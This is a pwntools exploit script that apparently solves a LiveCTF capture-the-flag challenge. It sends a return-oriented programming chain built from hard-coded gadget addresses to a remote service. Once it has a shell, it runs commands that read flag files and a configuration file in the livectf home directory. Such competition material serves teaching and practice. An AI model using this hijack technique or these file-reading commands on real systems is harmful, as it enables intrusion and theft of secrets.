from pwn import *

context.arch = 'amd64'

HOST = os.environ.get('HOST', 'localhost')
PORT = 31337

f = lambda x:hex(x)[2:].encode()

rdi_rbp = 0x402218
rsi_r15_rbp = 0x402216
ecx_zero = 0x434104 #: xor ecx, ecx ; mov rax, rcx ; ret ; (1 found)
edx_edi = 0x426378 #: mov edx, edi ; rep stosb ; mov rax, rdx ; ret ; (1 found)
add_eax_edi = 0x471886 #: add eax, edi ; ret ;
syscall = 0x437559
rax = 0x431010# : pop rax ; pop rbx ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; pop rbp ; ret ; (1 found)
jmp_rax = 0x408712

rbx_r12_rbp = 0x495900 #: pop rbx ; pop r12 ; pop rbp ; ret ; (1 found)
mov_edi_ebp = 0x461866 #: mov edi, ebp ; call rbx ; (1 found)
ret = 0x401814

ROP = [
    f(ret),
    f(ret),
    f(ret),
    b'400000000',
    f(ret),
    f(ret),
    f(ret),
    f(ret),
    f(ret),
    f(ret),
    f(ret),
    f(ret),
    f(ret),
    f(ret),
    f(ret),
    f(ret),
    f(ret),
    f(ret),
    f(ret),
    f(ret),
    f(ret),
    f(ret),

    f(rax),
    b'460489',
    b'1',
    b'1',
    b'1',
    b'1',
    b'1',
    b'1',

    f(rdi_rbp),
    b'40070',
    b'1',

    f(add_eax_edi),

    b'401914',
]

# p = process('./challenge')
p = remote(HOST, int(PORT))

for i in ROP:
    print(i)
    p.sendlineafter(b': ', i)

# p.interactive()

p.sendlineafter(b': ', b'0')

p.sendline(b'cat /flag*')
p.sendline(b'cat flag*')
p.sendline(b'cat /home/livectf/.config.toml')
p.sendline(b'./submitter')

# p.interactive()

flag = p.recvline_contains(b'LiveCTF{').decode().strip()

log.info('Flag: %s', flag)